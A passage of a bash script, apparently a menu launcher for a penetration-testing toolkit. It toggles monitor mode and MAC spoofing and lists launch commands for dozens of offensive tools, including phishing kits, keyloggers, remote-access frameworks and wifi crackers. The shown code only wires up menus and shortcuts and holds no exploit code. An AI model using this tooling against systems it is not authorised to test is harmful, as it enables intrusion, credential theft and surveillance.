\"$RS\"|\"$CE\" \"$YS\"start\"$CE\") Start monitor mode\"\n\t\techo -e \"\"$RS\" 2\"$CE\") Enable \"$RS\"$WLANNM\"$CE\"${SPACESM}\"$RS\"d2\"$CE\") Disable \"$RS\"$WLANNM\"$CE\"${SPACESM}  \"$RS\"|\"$CE\"  \"$YS\"stop\"$CE\") Stop monitor mode\"\n\telse\n\t\techo -e \"\"$YS\" 1\"$CE\") Enable $WLANN${SPACESN}\"$YS\"d1\"$CE\") Disable $WLANN${SPACESN}  \"$RS\"|\"$CE\" \"$YS\"start\"$CE\") Start monitor mode\"\n\t\techo -e \"\"$YS\" 2\"$CE\") Enable $WLANNM${SPACESM}\"$YS\"d2\"$CE\") Disable $WLANNM${SPACESM}  \"$RS\"|\"$CE\"  \"$YS\"stop\"$CE\") Stop monitor mode\"\n\tfi\n\techo -e \"\"$YS\" 3\"$CE\") Change MAC        \"$YS\"d3\"$CE\") Restore original MAC \"$RS\"|\"$CE\"\"$YS\"update\"$CE\") Check for updates\"\n\tif [[ -f /usr/bin/anonym8 ]]\n\tthen\n\techo -e \"\"$YS\" 4\"$CE\") Enable anonym8    \"$YS\"d4\"$CE\") Disable anonym8      \"$RS\"|\"$CE\"\"$YS\"errors\"$CE\") Fix some errors\"\n\telse\n\techo -e \"\"$RS\" 4\"$CE\") Enable anonym8    \"$RS\"d4\"$CE\") Disable anonym8      \"$RS\"|\"$CE\"\"$YS\"errors\"$CE\") Fix some errors\"\n\tfi\n\tif [[ -f /usr/bin/anonsurf ]]\n\tthen\n\techo -e \"\"$YS\" 5\"$CE\") Enable anonsurf   \"$YS\"d5\"$CE\") Disable anonsurf     \"$RS\"|\"$CE\"    \"$YS\"ks\"$CE\") Keyboard shortucts\"\n\techo -e \"\"$YS\" 6\"$CE\") Anonsurf's status \"$YS\"d6\"$CE\") Restart anonsurf     \"$RS\"|\"$CE\"\"$YS\"     d\"$CE\") Buy me a coffee\"\n\telse\n\techo -e \"\"$RS\" 5\"$CE\") Enable anonsurf   \"$RS\"d5\"$CE\") Disable anonsurf     \"$RS\"|\"$CE\"    \"$YS\"ks\"$CE\") Keyboard shortucts\"\n\techo -e \"\"$RS\" 6\"$CE\") Anonsurf's status \"$RS\"d6\"$CE\") Restart anonsurf     \"$RS\"|\"$CE\"     \"$YS\"d\"$CE\") Buy me a coffee\"\n\tfi\n\techo -e \"\"$YS\" 7\"$CE\") View public IP                             \"$RS\"|\"$CE\"     \"$YS\"s\"$CE\") Go to settings menu\"\n\techo -e \"\"$YS\" 8\"$CE\") View MAC\"\n\techo -e \"\"$YS\" 9\"$CE\") TOOLS             \"$YS\"15\"$CE\") Spoof EMAIL           \"$YS\"22\"$CE\") Show bandwidth\"\n\tif [[ -f /root/ngrok ]]\n\tthen\n\t\techo -e \"\"$YS\"10\"$CE\") Handshake         \"$YS\"16\"$CE\") Ngrok port forward\"\n\telse\n\t\techo -e \"\"$YS\"10\"$CE\") Handshake         \"$RS\"16\"$CE\") \"$RS\"Ngrok\"$CE\" port forward\"\n\tfi\n\tif [[ -f /usr/local/bin/howdoi ]]\n\tthen\n\t\techo -e \"\"$YS\"11\"$CE\") Find WPS pin      \"$YS\"17\"$CE\") Ask (Howdoi tool)\"\n\telse\n\t\techo -e \"\"$YS\"11\"$CE\") Find WPS pin      \"$RS\"17\"$CE\") Ask (\"$RS\"Howdoi\"$CE\" tool)\"\n\tfi\n\techo -e \"\"$YS\"12\"$CE\") WEP menu          \"$YS\"18\"$CE\") Auto-exploit browser\"\n\techo -e \"\"$YS\"13\"$CE\") MITM              \"$YS\"19\"$CE\") Geolocate an IP\"\n\techo -e \"\"$YS\"14\"$CE\") Metasploit        \"$YS\"20\"$CE\") Bruteforce login\"   \n\techo -e \"\"$YS\" 0\"$CE\") Exit              \"$YS\"21\"$CE\") Sqlmap automated\"\n\techo \"Choose: \"\n\tread -e YORNAA\n\t#~ echo \"$YORNNA\"\n\t#~ history -s \"$YORNNA\"\n\tclear\n}\nfunction enable_wlan\n{\n\tO4=0\n\techo -e \"Enabling $WLANN...\"\n\trfkill unblock wifi &> /dev/null; rfkill unblock all &> /dev/null\n\tifconfig $WLANN up &>/dev/null && echo -e \"\"$YS\"Done\"$CE\"\" && O4=1  || echo -e \"\"$RS\"Error. I can't find your wireless adapter\"$CE\"\"\n}\nfunction disable_wlan\n{\n\techo -e \"Disabling $WLANN...\"\n\trfkill unblock wifi &> /dev/null; rfkill unblock all &> /dev/null\n\tifconfig $WLANN down &>/dev/null && echo -e \"\"$YS\"Done\"$CE\"\" && O4=1 || echo -e \"\"$RS\"Error. I can't find your wireless adapter.\"$CE\"\"\n}\nfunction interface_selection\n{\nif [[ \"$WLANCHECKING\" = \"\" ]]\nthen\n\techo -e \"\"$RS\" 1\"$CE\") $WLANN\"\nelse\n\techo -e \"\"$YS\" 1\"$CE\") $WLANN\"\nfi\nif [[ \"$WLANMCHECKING\" = \"\" ]]\nthen\n\techo -e \"\"$RS\" 2\"$CE\") $WLANNM\"\nelse\n\techo -e \"\"$YS\" 2\"$CE\") $WLANNM\"\nfi\necho -e \"\"$YS\" 3\"$CE\") \"$ETH\"\"\necho -e \"\"$YS\" b\"$CE\") Main menu\"\necho -e \"\"$YS\" 0\"$CE\") EXIT\"\necho -e \"Choose: \"\nread -e MYINT\nif [[ \"$MYINT\" = \"2\" ]]\nthen\n\tif [[ \"$WLANMCHECKING\" = \"\" ]]\n\tthen\n\t\tMYINT=\"OFF\"\n\telse\n\t\tMYINT=\"$WLANNM\"\n\tfi\nelif [[ \"$MYINT\" = \"1\" ]]\nthen\n\tif [[ \"$WLANCHECKING\" = \"\" ]]\n\tthen\n\t\tMYINT=\"OFF\"\n\telse\n\t\tMYINT=\"$WLANN\"\n\tfi\nelif [[ \"$MYINT\" = \"0\" ]]\nthen\n\tclear\n\texit\nelif [[ \"$MYINT\" = \"00\" || \"$MYINT\" = \"b\" ]]\nthen\n\texec bash \"$0\"\nelif [[ \"$MYINT\" = \"3\" ]]\nthen\n\tMYINT=\"$ETH\"\nelse\necho -e \"Wrong choice...\"\nsleep 2\nclear\necho -e \"EXITING\"\nsleep 1\nexec bash \"$0\"\nfi\nexport MYINT\n}\nfunction change_mac\n{\n\tinterface_selection\n\tclear\n\tif [[ \"$MYINT\" = \"OFF\" ]]\n\tthen\n\t\techo -e \"Interface not available\"\n\t\tsleep 2\n\telse\n\t\techo -e \"Change it to a random or specific?(\"$YS\"r\"$CE\"/\"$YS\"s\"$CE\")(\"$YS\"Enter\"$CE\"=r): \"\n\t\tread -e RORS\n\t\tclear\n\t\tif [[ \"$RORS\" != \"s\" ]]\n\t\tthen\n\t\t\techo -e \"Changing mac address of $MYINT to a random one...\"\n\t\t\tifconfig $MYINT down\n\t\t\tmacchanger -r $MYINT\n\t\t\tifconfig $MYINT up\n\t\t\techo -e \"Done.\"\n\t\telse\n\t\t\techo -e \"Enter the MAC you want:\"\n\t\t\tread -e SMAC\n\t\t\techo -e \"Changing mac address of $MYINT to $SMAC...\"\n\t\t\tifconfig $MYINT down\n\t\t\tmacchanger -m $SMAC $MYINT\n\t\t\tifconfig $MYINT up\n\t\t\techo -e \"Done.\"\n\t\tfi\n\tfi\n}\nfunction set_interface_number\n{\nclear\nwhile true\ndo\necho -e \"Enter the name of your wireless interface when in \"$RS\"managed\"$CE\" mode(\"$YS\"Enter\"$CE\"=wlan0): \"\nread MANAGED\nif [[ \"$MANAGED\" = \"\" ]]\nthen\n\tMANAGED=\"wlan0\"\nfi\necho -e \"Enter the name of your wireless interface when in \"$RS\"monitor\"$CE\" mode(\"$YS\"Enter\"$CE\"=wlan0mon): \"\nread MONITOR\nif [[ \"$MONITOR\" = \"\" ]]\nthen\n\tMONITOR=\"wlan0mon\"\nfi\necho -e \"Enter the name of your wired interface(\"$YS\"Enter\"$CE\"=\"eth0\"): \"\nread WIRED\nif [[ \"$WIRED\" = \"\" ]]\nthen\n\tWIRED=\"eth0\"\nfi\n\techo \"$MANAGED\" > \"$LPATH\"/wlan.txt\n\techo \"$MONITOR\" > \"$LPATH\"/wlanmon.txt\n\techo \"$WIRED\" > \"$LPATH\"/eth.txt\n\techo -e \"\"$YS\"Done\"$CE\"\"\n\tsleep 1\n\tclear\n\techo -e \"\"$BS\"If you want to change it, type \"$CE\"\"$YS\"interface\"$CE\"\"$BS\" any time\"$CE\"\"\n\tsleep 3\n\techo -e \"$PAKTC\"\n\t$READAK\t\n\tBACKL=\"1\"\n\tbreak\ndone\n}\nfunction checkifalready\n{\n\tGOOD=\"1\"\n\tnum=1\n\twhile [ $num -le 20 ]\n\tdo\n\t\tif [[ \"$CHECKKS\" = \"$num\" ]]\n\t\tthen\n\t\t\tGOOD=\"0\"\n\t\t\techo -e \"\"$RS\"This shortcut is already in use by the script.\"$CE\"\"\n\t\t\tsleep 3\n\t\tfi\n\t\tnum=$(( num+1 ))\n\tdone\n\tif [[ \"$GOOD\" = \"1\" ]]\n\tthen\n\t\tif [[ \"$CHECKKS\" = \"etercheck\" || \"$CHECKKS\" = \"eternalblue\" || \"$CHECKKS\" = \"changelog\" || \"$CHECKKS\" = \"wififb\" || \"$CHECKKS\" = \"nessusstop\" || \"$CHECKKS\" = \"nessusstart\" || \"$CHECKKS\" = \"pstop\" || \"$CHECKKS\" = \"pstart\" || \"$CHECKKS\" = \"astop\" || \"$CHECKKS\" = \"astart\" || \"$CHECKKS\" = \"settings\" || \"$CHECKKS\" = \"donate\" || \"$CHECKKS\" = \"d\" || \"$CHECKKS\" = \"s\" || \"$CHECKKS\" = \"g\" || \"$CHECKKS\" = \"l\" || \"$CHECKKS\" = \"\" || \"$CHECKKS\" = \"if\" || \"$CHECKKS\" = \"ifconfig\" || \"$CHECKKS\" = \"interfaces\" || \"$CHECKKS\" = \"interface\" || \"$CHECKKS\" = \"errors\" || \"$CHECKKS\" = \"00\" || \"$CHECKKS\" = \"exit\" || \"$CHECKKS\" = \"update\" || \"$CHECKKS\" = \"d1\" || \"$CHECKKS\" = \"d2\" || \"$CHECKKS\" = \"d3\" || \"$CHECKKS\" = \"d4\" || \"$CHECKKS\" = \"d5\" || \"$CHECKKS\" = \"d6\" || \"$CHECKKS\" = \"d7\" || \"$CHECKKS\" = \"gg\" || \"$CHECKKS\" = \"ks\" ]]\n\t\tthen\n\t\t\tGOOD=\"0\"\n\t\t\techo -e \"\"$RS\"This shortcut is already in use by the script.\"$CE\"\"\n\t\t\tsleep 3\n\t\tfi\n\tfi\n\tif [[ \"$CHECKKS\" = \"delete\" ]]\n\tthen\n\t\tGOOD=\"0\"\n\tfi\n\t#~ if [[ \"$CHECKKS\" = \"b\" || \"$CHECKKS\" = \"back\" ]]\n\t#~ then\n\t\t#~ GOOD=\"0\"\n\t#~ fi\n\tif [[ \"$GOOD\" = \"1\" ]]\n\tthen\n\t\tBACKUPTITLE=\"$TITLE\"\n\t\tBACKUPNN=\"$nn\"\n\t\tnum=1\n\t\twhile [[ $num -le \"$HOWMANYTOOLS\" ]]\n\t\tdo\n\t\tnn=\"$num\"\n\t\tlistshortcuts\n\t\tif [[ -f \"\"$KSPATH\"/\"$TITLE\"/\"$TITLE\"ks.txt\" ]]\n\t\tthen\n\t\t\tread KSIFALREADY < \"$KSPATH\"/\"$TITLE\"/\"$TITLE\"ks.txt\n\t\t\tif [[ \"$CHECKKS\" == \"$KSIFALREADY\" ]]\n\t\t\tthen\n\t\t\t\techo -e \"\"$RS\"Shortcut '\"$CHECKKS\"' is already in use by \"$TITLE\"\"$CE\"\"\n\t\t\t\tGOOD=0\n\t\t\t\tsleep 3\n\t\t\tfi\n\t\tfi\n\t\tnum=$(( num+1 ))\n\t\tdone\n\t\tnn=\"$BACKUPNN\"\n\t\tTITLE=\"$BACKUPTITLE\"\n\tfi\n\tclear\n}\t\nfunction createshortcut\n{\nif [[ ! -d \"\"$KSPATH\"/$TITLE\" ]]\nthen\n\tmkdir \"$KSPATH\"/\"$TITLE\"\nfi\nclear\necho -e \"Enter the keyboard shortcut that will open \"$TITLE\" from lscript's main menu\"\necho -e \"(e.g: \"$YS\"\"$TITLE\"\"$CE\")\"\necho -e \"To delete it , type:   \"$YS\"delete\"$CE\"\"\necho -e \"\"$YS\" b\"$CE\") Go back\"\nread CHECKKS\nif [[ \"$CHECKKS\" = \"back\" || \"$CHECKKS\" = \"b\" ]]\nthen\n\tclear\n\tBACKKS=1\n\tbreak\nelse\n\tBACKKS=0\n\tif [[ \"$BACKKS\" == 0 ]]\n\tthen\n\t\tCHECKKSBACKUP=\"$CHECKKS\"\n\t\tNAMECDBACKUP=\"$NAMECD\"\n\t\tKSSETBACKUP=\"$KSSET\"\n\t\tcheckifalready\n\t\tCHECKKS=\"$CHECKKSBACKUP\"\n\t\tNAMECD=\"$NAMECDBACKUP\"\n\t\tKSSET=\"$KSSETBACKUP\"\n\t\tif [[ \"$GOOD\" = \"1\" ]]\n\t\tthen\n\t\t\techo -e \"Shortcut is ok.Setting it up...\"\n\t\t\tsleep 1\n\t\t\techo \"$CHECKKS\" > \"$KSPATH\"/\"$TITLE\"/\"$TITLE\"ks.txt\n\t\t\techo \"$NAMECD\" > \"$KSPATH\"/\"$TITLE\"/\"$TITLE\".txt\n\t\t\techo \"$KSSET\" > \"$KSPATH\"/\"$TITLE\"/\"$TITLE\"2.txt\n\t\t\techo -e \"Done!\"\n\t\t\techo -e \"$PAKTGB\"\n\t\t\t$READAK\n\t\t\tclear\n\t\t\t#break\n\t\telse\n\t\t\tclear\n\t\t\techo -e \"Removing shortcut for \"$TITLE\"...\"\n\t\t\trm -r \"$KSPATH\"/\"$TITLE\"\n\t\t\tsleep 1\n\t\t\techo -e \"Done.\"\n\t\t\techo -e \"$PAKTGB\"\n\t\t\t$READAK\n\t\t\tclear\n\t\t\t#break\n\t\tfi\n\telse\n\t\tbreak\n\tfi\nfi\n}\nfunction listshortcuts\n{\t\n\tEXTRA1=\"\"\n\tif [[ \"$nn\" = \"1\" ]]\n\tthen\n\t\tTITLE=\"Fluxion\"\n\t\tNAMECD=\"cd /root/fluxion\"\n\t\tKSSET=\"./fluxion*\"\n\telif [[ \"$nn\" = \"2\" ]]\n\tthen\n\t\tTITLE=\"Zirikatu\"\n\t\tNAMECD=\"cd /root/zirikatu\"\n\t\tKSSET=\"./zirikatu.sh\"\n\telif [[ \"$nn\" = \"3\" ]]\n\tthen\n\t\tTITLE=\"Wifite\"\n\t\tNAMECD=\"\"\n\t\tKSSET=\"wifite\"\n\telif [[ \"$nn\" = \"4\" ]]\n\tthen\n\t\tTITLE=\"Wifiphisher\"\n\t\tNAMECD=\"\"\n\t\tKSSET=\"wifiphisher\"\n\telif [[ \"$nn\" = \"5\" ]]\n\tthen\n\t\tTITLE=\"Zatacker\"\n\t\tNAMECD=\"cd /root/Zatacker\"\n\t\tKSSET=\"./ZT.sh\"\n\telif [[ \"$nn\" = \"6\" ]]\n\tthen\n\t\tTITLE=\"Morpheus\"\n\t\tNAMECD=\"cd /root/morpheus\"\n\t\tKSSET=\"./morpheus.sh\"\n\telif [[ \"$nn\" = \"7\" ]]\n\tthen\n\t\tTITLE=\"Hakku\"\n\t\tNAMECD=\"cd /root/hakkuframework\"\n\t\tKSSET=\"./hakku\"\n\telif [[ \"$nn\" = \"8\" ]]\n\tthen\n\t\tTITLE=\"Trity\"\n\t\tNAMECD=\"\"\n\t\tKSSET=\"trity\"\n\telif [[ \"$nn\" = \"9\" ]]\n\tthen\n\t\tTITLE=\"Cupp\"\n\t\tNAMECD=\"cd /root/cupp\"\n\t\tKSSET=\"python cupp.py -i\"\n\telif [[ \"$nn\" = \"10\" ]]\n\tthen\n\t\tTITLE=\"Dracnmap\"\n\t\tNAMECD=\"cd /root/Dracnmap\"\n\t\tKSSET=\"./dracnmap-v*.sh\"\n\telif [[ \"$nn\" = \"11\" ]]\n\tthen\n\t\tTITLE=\"Fern\"\n\t\tNAMECD=\"\"\n\t\tKSSET=\"fern-wifi-cracker\"\n\telif [[ \"$nn\" = \"12\" ]]\n\tthen\n\t\tTITLE=\"KickThemOut\"\n\t\tNAMECD=\"cd /root/kickthemout\"\n\t\tKSSET=\"python kickthemout.py\"\n\telif [[ \"$nn\" = \"13\" ]]\n\tthen\n\t\tTITLE=\"Ghost-Phisher\"\n\t\tNAMECD=\"\"\n\t\tKSSET=\"ghost-phisher\"\n\telif [[ \"$nn\" = \"14\" ]]\n\tthen\n\t\tTITLE=\"Xerxes\"\n\t\tNAMECD=\"cd /root/xerxes\"\n\t\tKSSET=\"./xerxes\"\n\telif [[ \"$nn\" = \"15\" ]]\n\tthen\n\t\tTITLE=\"Katana\"\n\t\tNAMECD=\"\"\n\t\tKSSET=\"ktf.console\"\n\telif [[ \"$nn\" = \"16\" ]]\n\tthen\n\t\tTITLE=\"Airgeddon\"\n\t\tNAMECD=\"cd /root/airgeddon\"\n\t\tKSSET=\"./airgeddon.sh\"\n\telif [[ \"$nn\" = \"17\" ]]\n\tthen\n\t\tTITLE=\"Websploit\"\n\t\tNAMECD=\"\"\n\t\tKSSET=\"websploit\"\n\telif [[ \"$nn\" = \"18\" ]]\n\tthen\n\t\tTITLE=\"BeeLogger\"\n\t\tNAMECD=\"cd /root/BeeLogger\"\n\t\tKSSET=\"python bee.py\"\n\telif [[ \"$nn\" = \"19\" ]]\n\tthen\n\t\tTITLE=\"Ezsploit\"\n\t\tNAMECD=\"cd /root/exsploit\"\n\t\tKSSET=\"./ezsploit.sh\"\n\telif [[ \"$nn\" = \"20\" ]]\n\tthen\n\t\tTITLE=\"Pupy\"\n\t\tNAMECD=\"cd /root/pupy/pupy\"\n\t\tKSSET=\"./pupysh.py\"\n\telif [[ \"$nn\" = \"21\" ]]\n\tthen\n\t\tTITLE=\"TheFatRat\"\n\t\tNAMECD=\"cd /root/TheFatRat\"\n\t\tKSSET=\"./fatrat\"\n\telif [[ \"$nn\" = \"22\" ]]\n\tthen\n\t\tTITLE=\"Angry_IP_Scanner\"\n\t\tNAMECD=\" \"\n\t\tKSSET=\"ipscan\"\n\t#~ elif [[ \"$nn\" = \"23\" ]]\n\t#~ then\n\t\t#~ TITLE=\"Sniper\"\n\t\t#~ NAMECD='read -p 'DOMAIN:' DOMAIN'\n\t\t#~ KSSET=\"sniper $DOMAIN\"\n\telif [[ \"$nn\" = \"23\" ]]\n\tthen\n\t\tTITLE=\"ReconDog\"\n\t\tNAMECD=\"cd /root/ReconDog\"\n\t\tKSSET=\"python dog.py\"\n\telif [[ \"$nn\" = \"24\" ]]\n\tthen\n\t\tTITLE=\"RED_HAWK\"\n\t\tNAMECD=\"cd /root/RED_HAWK\"\n\t\tKSSET=\"php rhawk.php\"\n\telif [[ \"$nn\" = \"25\" ]]\n\tthen\n\t\tTITLE=\"Winpayloads\"\n\t\tNAMECD=\"cd /root/Winpayloads\"\n\t\tKSSET=\"./WinPayloads.py\"\n\telif [[ \"$nn\" = \"26\" ]]\n\tthen\n\t\tTITLE=\"CHAOS\"\n\t\tNAMECD=\"cd /root/CHAOS\"\n\t\tKSSET=\"go run CHAOS.go\"\n\telif [[ \"$nn\" = \"27\" ]]\n\tthen\n\t\tTITLE=\"Routersploit\"\n\t\tNAMECD=\"cd /root/routersploit\"\n\t\tKSSET=\"./rsf.py\"\n\telif [[ \"$nn\" = \"28\" ]]\n\tthen\n\t\tTITLE=\"nWatch\"\n\t\tNAMECD=\"cd /root/nWatch\"\n\t\tKSSET=\"python nwatch.py\"\n\telif [[ \"$nn\" = \"29\" ]]\n\tthen\n\t\tTITLE=\"Eternal_scanner\"\n\t\tNAMECD=\"cd /root/eternal_scanner\"\n\t\tKSSET=\"./escan\"\n\telif [[ \"$nn\" = \"30\" ]]\n\tthen\n\t\tTITLE=\"LALIN\"\n\t\tNAMECD=\"cd /root/LALIN\"\n\t\tKSSET=\"./Lalin.sh\"\n\telif [[ \"$nn\" = \"31\" ]]\n\tthen\n\t\tTITLE=\"Shellter\"\n\t\tNAMECD=\"\"\n\t\tKSSET=\"shellter\"\n\telif [[ \"$nn\" = \"32\" ]]\n\tthen\n\t\tTITLE=\"Netattack2\"\n\t\tNAMECD=\"cd /root/netattack2\"\n\t\tKSSET=\"python2 netattack2.py\"\n\telif [[ \"$nn\" = \"33\" ]]\n\tthen\n\t\tTITLE=\"Operative-framework\"\n\t\tNAMECD=\"cd /root/operative-framework\"\n\t\tKSSET=\"python operative.py\"\n\telif [[ \"$nn\" = \"34\" ]]\n\tthen\n\t\tTITLE=\"Koadic\"\n\t\tNAMECD=\"cd /root/koadic\"\n\t\tKSSET=\"./koadic\"\n\telif [[ \"$nn\" = \"35\" ]]\n\tthen\n\t\tTITLE=\"Empire\"\n\t\tNAMECD=\"cd /root/Empire\"\n\t\tKSSET=\"./empire\"\n\telif [[ \"$nn\" = \"36\" ]]\n\tthen\n\t\tTITLE=\"Meterpreter_Paranoid_Mode\"\n\t\tNAMECD=\"cd /root/Meterpreter_Paranoid_Mode-SSL\"\n\t\tKSSET=\"./Meterpreter_Paranoid_Mode.sh\"\n\telif [[ \"$nn\" = \"37\" ]]\n\tthen\n\t\tTITLE=\"Wifi-Pumpkin\"\n\t\tNAMECD=\"\"\n\t\tKSSET=\"wifi-pumpkin\"\n\telif [[ \"$nn\" = \"38\" ]]\n\tthen\n\t\tTITLE=\"Veil\"\n\t\tNAMECD=\"cd /root/Veil\"\n\t\tKSSET=\"./Veil.py\"\n\telif [[ \"$nn\" = \"39\" ]]\n\tthen\n\t\tTITLE=\"Leviathan\"\n\t\tNAMECD=\"cd /root/leviathan\"\n\t\tKSSET=\"python leviathan.py\"\n\telif [[ \"$nn\" = \"40\" ]]\n\tthen\n\t\tTITLE=\"Gloom-Framework\"\n\t\tNAMECD=\"cd /root/Gloom-Framework\"\n\t\tKSSET=\"python gloom.py\"\n\telif [[ \"$nn\" = \"41\" ]]\n\tthen\n\t\tTITLE=\"Arcanus\"\n\t\tNAMECD=\"cd /root/ARCANUS\"\n\t\tKSSET=\"./ARCANUS\"\n\telif [[ \"$nn\" = \"42\" ]]\n\tthen\n\t\tTITLE=\"LFISuite\"\n\t\tNAMECD=\"cd /root/LFISuite\"\n\t\tKSSET=\"python lfisuite.py\"\n\telif [[ \"$nn\" = \"43\" ]]\n\tthen\n\t\tTITLE=\"DKMC\"\n\t\tNAMECD=\"cd /root/DKMC\"\n\t\tKSSET=\"python dkmc.py\"\n\telif [[ \"$nn\" = \"44\" ]]\n\tthen\n\t\tTITLE=\"SecHub\"\n\t\tNAMECD=\"\"\n\t\tKSSET=\"sechub\"\n\telif [[ \"$nn\" = \"45\" ]]\n\tthen\n\t\tTITLE=\"Beef-xss\"\n\t\tNAMECD=\"cd /usr/share/beef-xss\"\n\t\tKSSET=\"./beef\"\n\telif [[ \"$nn\" = \"46\" ]]\n\tthen\n\t\tTITLE=\"Evil-Droid\"\n\t\tNAMECD=\"cd /root/Evil-Droid\"\n\t\tKSSET=\"./evil-droid\"\n\telif [[ \"$nn\" = \"47\" ]]\n\tthen\n\t\tTITLE=\"NoSQLMap\"\n\t\tNAMECD=\"cd /root/NoSQLMap\"\n\t\tKSSET=\"python nosqlmap.py\"\n\telif [[ \"$nn\" = \"48\" ]]\n\tthen\n\t\tTITLE=\"EggShell\"\n\t\tNAMECD=\"cd /root/EggShell\"\n\t\tKSSET=\"python eggshell.py\"\n\telif [[ \"$nn\" = \"49\" ]]\n\tthen\n\t\tTITLE=\"Zerodoor\"\n\t\tNAMECD=\"cd /root/Zerodoor\"\n\t\tKSSET=\"python zerodoor.py\"\n\telif [[ \"$nn\" = \"50\" ]]\n\tthen\n\t\tTITLE=\"AutoSploit\"\n\t\tNAMECD=\"cd /root/AutoSploit\"\n\t\tKSSET=\"python autosploit.py\"\n\telif [[ \"$nn\" = \"51\" ]]\n\tthen\n\t\tTITLE=\"Enigma\"\n\t\tNAMECD=\"cd /root/Enigma\"\n\t\tKSSET=\"python enigma.py\"\n\telif [[ \"$nn\" = \"52\" ]]\n\tthen\n\t\tTITLE=\"SocialFish\"\n\t\tNAMECD=\"cd /root/SocialFish\"\n\t\tKSSET=\"python SocialFish.py\"\n\telif [[ \"$nn\" = \"53\" ]]\n\tthen\n\t\tTITLE=\"Yuki-Chan-The-Auto-Pentest\"\n\t\tNAMECD=\"cd /root/Yuki-Chan-The-Auto-Pentest\"\n\t\tKSSET=\"./yuki.sh\"\n\tfi\n}\nfunction reinstall_tools\n{\nwhile true\ndo\n\tclear\n\t\t#counting the tools\n\tTOOLSNUM=${#toolarray[@]}\n\tHALFTOOLS=$((TOOLSNUM/2+1))\n\t\t#number for 2ond column\n\tCLMN2=$((HALFTOOLS+1))\n\tCLMN2TOOLS=$((TOOLSNUM/2+1))\n\t\t#alphabetically sort tools\n\treadarray -t toolarraysorted < <(for a in \"${toolarray[@]}\"; do echo \"$a\"; done | sort)\n\techo -e \"\"$BS\"Select out of $TOOLSNUM tools to install/update:\"$CE\"\"\n\t\t#set colour of selected\n\tSEL=\"$YS\"\n\tn=0\n\twhile [[ \"$n\" -lt \"$HALFTOOLS\" ]]\n\tdo\n\t\t\t#start echoing from number 1 instead of number 0(fist array)\n\t\tk=$((n+1))\n\t\t\t#fixing the spaces to sort output better\n\t\tif [[ \"$k\" -le 9 ]]\n\t\tthen\n\t\t\tm=\"  \"$k\"\"\n\t\telif [[ \"$k\" -ge 10 && \"$k\" -le 99 ]]\n\t\tthen\n\t\t\tm=\" \"$k\"\"\n\t\telse\n\t\t\tm=\"$k\"\n\t\tfi\n\t\t\t#calculating how many spaces needed for correct output\n\t\tsize=${#toolarraysorted[\"$n\"]}\n\t\tcalc=$(( 35-size ))\n\t\tnumcalc=1\n\t\tSPACES=\"\"\n\t\twhile [[ \"$numcalc\" != \"$calc\" ]]\n\t\tdo\n\t\t\tSPACES=\"\"${SPACES}\" \"\n\t\t\tnumcalc=$(( numcalc+1 ))\n\t\tdone\n\t\tCOL1=\"\"\n\t\tCOL2=\"\"\n\t\tif [[ \"${selected[\"$n\"]}\" == 1 ]]\n\t\tthen\n\t\t\tCOL1=\"$SEL\"\n\t\tfi\n\t\tif [[ \"${selected[\"$CLMN2TOOLS\"]}\" == 1 ]]\n\t\tthen\n\t\t\tCOL2=\"$SEL\"\n\t\tfi\n\t\tif [[ \"${toolarraysorted[\"$CLMN2TOOLS\"]}\" == \"\" ]]\n\t\tthen\n\t\t\techo -e \"\"$YS\"${m}\"$CE\") \"$COL1\"\"${toolarraysorted[\"$n\"]}\"\"$CE\"\"\n\t\telse\n\t\t\techo -e \"\"$YS\"${m}\"$CE\") \"$COL1\"\"${toolarraysorted[\"$n\"]}\"\"$CE\"${SPACES}\"$YS\"\"$CLMN2\"\"$CE\") \"$COL2\"\"${toolarraysorted[\"$CLMN2TOOLS\"]}\"\"$CE\"\"\n\t\tfi\n\t\tn=$((n+1))\n\t\tCLMN2=$((CLMN2+1))\n\t\tCLMN2TOOLS=$((CLMN2TOOLS+1))\n\tdone\n\techo -e \"  \"$YS\"b\"$CE\") Go back\"\n\techo -e \"  \"$YS\"s\"$CE\") Start installing selected tools\"\n\techo -e \"  \"$YS\"r\"$CE\") Reset selection\"\n\tif [[ \"$NOCONFIRM\" == 1 ]]\n\tthen\n\t\techo -e \"  \"$YS\"n\"$CE\") \"$YS\"No confirmation\"$CE\"\"\n\telse\n\t\techo -e \"  \"$YS\"n\"$CE\") No confirmation\"\n\tfi\n\techo -e \"  \"$YS\"0\"$CE\") Exit\"\n\techo -e \"  Choose: \"\n\tread ST\n\tif [[ \"$ST\" == \"b\" || \"$ST\" == \"back\" ]]\n\tthen\n\t\tclear\n\t\tbreak\n\telif [[ \"$ST\" == 0 ]]\n\tthen\n\t\texit\n\telif [[ \"$ST\" == 00 ]]\n\tthen\n\t\texec bash $0\n\telif [[ \"$ST\" == \"r\" ]]\n\tthen\n\t\tp=0\n\t\twhile [[ \"$p\" -le \"$TOOLSNUM\" ]]\n\t\tdo\n\t\t\tselected[\"$p\"]=0\n\t\t\tp=$((p+1))\n\t\tdone\n\telif [[ \"$ST\" == \"s\" ]]\n\tthen\n\t\tz=0\n\t\tHOWMANYSELECTED=0\n\t\twhile [[ \"$z\" -lt \"$TOOLSNUM\" ]]\n\t\tdo\n\t\t\tif [[ ${selected[\"$z\"]} == 1 ]]\n\t\t\tthen\n\t\t\t\tHOWMANYSELECTED=$((HOWMANYSELECTED+1))\n\t\t\t\ttoolselected[\"$HOWMANYSELECTED\"]=${toolarraysorted[\"$z\"]}\n\t\t\tfi\n\t\t\tz=$((z+1))\n\t\tdone\n\t\tif [[ \"$HOWMANYSELECTED\" == 0 ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"No tools selected\"$CE\"\"\n\t\t\tsleep 2\n\t\t\tcontinue\n\t\tfi\n\t\tj=1\n\t\twhile [[ \"$j\" -le \"$HOWMANYSELECTED\" ]]\n\t\tdo\n\t\t\tclear\n\t\t\techo -e \"\"$YS\"Installing \"${toolselected[\"$j\"]}\"\"$CE\"(\"$YS\"$j\"$CE\"/\"$YS\"$HOWMANYSELECTED\"$CE\")\"\n\t\t\tsleep 1\n\t\t\tcommand=\"install_\"${toolselected[\"$j\"]}\"\"\n\t\t\t$command\n\t\t\tj=$((j+1))\n\t\tdone\n\t\tp=0\n\t\twhile [[ \"$p\" -le \"$TOOLSNUM\" ]]\n\t\tdo\n\t\t\tselected[\"$p\"]=0\n\t\t\tp=$((p+1))\n\t\tdone\n\t\tNOCONFIRM=0\n\t\techo -e \"$PAKTGB\"\n\t\t$READAK\n\telif [[ \"$ST\" == \"n\" ]]\n\tthen\n\t\tif [[ \"$NOCONFIRM\" != 1 